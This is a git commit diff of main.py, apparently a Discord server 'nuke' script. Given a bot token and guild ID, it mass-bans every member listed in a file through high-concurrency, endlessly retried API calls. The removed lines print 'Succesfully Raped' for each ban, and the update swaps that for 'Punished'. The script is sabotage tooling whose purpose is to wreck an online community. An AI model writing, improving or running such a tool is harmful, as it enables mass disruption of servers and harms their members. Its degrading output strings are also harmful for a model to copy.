d8f0e9335d1e83605cbd8ac4d52bc5d7550dc261
villain <91448412+eastsidevillain@users.noreply.github.com>
2022-01-14 03:20:31 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,40 +1,47 @@
-import aiohttp, tasksio, asyncio, random, os
+import os, aiohttp, random, tasksio, asyncio
+from colorama import Fore, Style
 
-class Nuke:
+
+
+class Client:
 
     def __init__(self):
-        self.clear = lambda: os.system('cls & mode 80, 23 ')
-        self.clear()
-
-        self.token, self.guild = input("Bot Token -> "), input('Guild ID -> ')
-        self.headers = {"Authorization": "Bot {}".format(self.token)}
-        self.api = random.randint(6, 9); self.ban_reason = 'villainlovesyou'
-    
-        self.tasks = 1400 #->// Change This To The Amount Of Tasks
+        self.Clear = lambda: os.system('cls & mode 80,23')
+        self.Clear()
+        self.Token, self.Guild = input(f'{Fore.CYAN}{Style.BRIGHT}Insert Token;{Fore.RESET} '), input(f'{Fore.CYAN}{Style.BRIGHT}Insert Guild;{Fore.RESET} ')
+        self.Tasks = int(input(f'{Fore.CYAN}{Style.BRIGHT}Enter Amount Of Tasks;{Fore.RESET} '))
+        self.Headers = {'Authorization': 'Bot {}'.format(self.Token)}
+        self.StatusCodes = [200,201,204]
+        self.Api = random.randint(6,9)
+        
+        
 
     async def execute(self, members):
         try:
-            async with aiohttp.ClientSession(headers=self.headers) as session:
-                async with session.put("https://discord.com/api/v{0}/guilds/{1}/bans/{2}?reason={3}".format(self.api, self.guild, members, self.ban_reason)) as response:
-                    if response.status == 200:
-                        print("Succesfully Raped -> {}".format(members))
+            async with aiohttp.ClientSession(headers=self.Headers) as client:
+                async with client.put('https://discord.com/api/v{0}/guilds/{1}/bans/{2}'.format(self.Api, self.Guild, members, )) as response:
+                    if response in self.StatusCodes:
+                        print('Succesfully Punished User -> {}'.format(members))
                     else:
-                        print("Failed To Rape ->  {}".format(members))
+                        print('Unable To Punish User -> {}'.format(members))
                     return await self.execute(members)
         except Exception:
-            print(f"-> There Was An Error Sending Requests ->")
+            print(f'')
             return await self.execute(members)
+        
+
 
     async def start(self):
-        async with tasksio.TaskPool(self.tasks) as pool:
+        async with tasksio.TaskPool(self.Tasks) as pool:
             while True:
-                for member in open("members.txt").read().splitlines():
-                    await pool.put(self.execute(member))     
-     
+                try:
+                    for member in open("data/members.txt").read().splitlines():
+                        await pool.put(self.execute(member))
+                except Exception:
+                    print(f'{Fore.RED}{Style.BRIGHT}There Was An Error, Press -> [Enter] To Exit!')
+                    os._exit(1)
+        
+
 if __name__ == "__main__":
-    client = Nuke()
+    client = Client()
     asyncio.get_event_loop().run_until_complete(client.start())
-
-
-
-
